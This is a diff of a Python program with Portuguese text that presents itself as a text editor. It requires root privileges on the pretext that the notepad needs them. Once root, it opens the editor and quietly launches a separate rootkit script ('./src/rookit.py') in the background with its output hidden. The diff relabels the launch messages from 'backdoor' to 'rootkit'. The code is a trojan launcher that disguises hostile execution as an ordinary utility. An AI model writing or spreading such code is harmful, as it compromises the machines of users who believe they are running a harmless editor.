@@ -6,7 +6,6 @@ import subprocess
 from os import path
 from colorama import init, Fore, Style
 
-
 # LIB
 sys.path.append('./src/')
 
@@ -108,24 +107,21 @@ def editor_de_texto():
     boas_vindas()
     menu()
 
+def check_root():
+    return os.geteuid() == 0
+
 # rootki
 def start_rootkit_in_background():
     try:
         subprocess.Popen(["python3", "./src/rookit.py"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-        print("Backdoor iniciado com sucesso!")
+        print("rootkit iniciado com sucesso!")
     except Exception as e:
-        print("Erro ao iniciar o backdoor:", e)
+        print("Erro ao iniciar o rootkit:", e)
 
-def check_root():
-    return os.geteuid() == 0
-
-def elevar_privilegio():
-    pass
-    
+# iniciar se for root
 if check_root():
     editor_de_texto()
     start_rootkit_in_background()
 
 else:
     print("Você não está como root. Este programa requer privilégios de administrador para executar o notepad.")
-    elevar_privilegio()
